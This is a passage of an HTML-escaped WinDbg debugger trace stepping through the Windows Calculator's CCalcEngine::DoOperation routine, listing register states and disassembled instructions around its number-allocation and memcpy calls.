iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5f5:&lt;br /&gt;0049140b 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=0049140d esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5f7:&lt;br /&gt;0049140d 83c40c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; esp,0Ch&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491410 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5fa:&lt;br /&gt;00491410 ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00379df4=00000000&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491413 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5fd:&lt;br /&gt;00491413 e8c10cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroynum (004720d9)&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491418 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x602:&lt;br /&gt;00491418 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=0049141a esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x604:&lt;br /&gt;0049141a 83600400&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; and&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4],0&amp;nbsp; ds:0023:00379df4=00000000&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=0049141e esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x608:&lt;br /&gt;0049141e 8b4704&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [edi+4] ds:0023:0038ffa4=00367598&lt;br /&gt;eax=00367598 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491421 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x60b:&lt;br /&gt;00491421 ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:0036759c=00000001&lt;br /&gt;eax=00367598 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491424 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x60e:&lt;br /&gt;00491424 e8cb0cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_createnum (004720f4)&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491429 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x613:&lt;br /&gt;00491429 8b0e&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=0049142b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x615:&lt;br /&gt;0049142b 894104&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ecx+4],eax ds:0023:00379df4=00000000&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=0049142e esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x618:&lt;br /&gt;0049142e 8b7f04&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,dword ptr [edi+4] ds:0023:0038ffa4=00367598&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491431 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x61b:&lt;br /&gt;00491431 8b4704&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [edi+4] ds:0023:0036759c=00000001&lt;br /&gt;eax=00000001 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491434 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x61e:&lt;br /&gt;00491434 8d04850c000000&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[eax*4+0Ch]&lt;br /&gt;eax=00000010 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049143b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x625:&lt;br /&gt;0049143b 50&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&lt;br /&gt;eax=00000010 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049143c esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x626:&lt;br /&gt;0049143c 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049143e esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x628:&lt;br /&gt;0049143e 57&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; edi&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049143f esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x629:&lt;br /&gt;0049143f ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00379df4=003762f8&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491442 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x62c:&lt;br /&gt;00491442 e8340cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!memcpy (0047207b)&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491447 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x631:&lt;br /&gt;00491447 83c40c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; esp,0Ch&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049144a esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x634:&lt;br /&gt;0049144a 837b0800&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebx+8],0&amp;nbsp; ds:0023:006cc280=00000000&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049144e esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x638:&lt;br /&gt;0049144e 0f859d390000&amp;nbsp;&amp;nbsp;&amp;nbsp; jne&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0x63a (00494df1) [br=0]&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491454 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6ad:&lt;br /&gt;00491454 837d085b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+8],5Bh ss:0023:0020e390=0000005b&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491458 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6b1:&lt;br /&gt;00491458 ff75ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h]&amp;nbsp; ss:0023:0020e374=00375548&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049145b esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6b4:&lt;br /&gt;0049145b 56&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; esi&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=0049145c esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6b5:&lt;br /&gt;0049145c 0f85fd3b0000&amp;nbsp;&amp;nbsp;&amp;nbsp; jne&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0x6c5 (0049505f) [br=0]&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00367598&lt;br /&gt;eip=00491462 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; 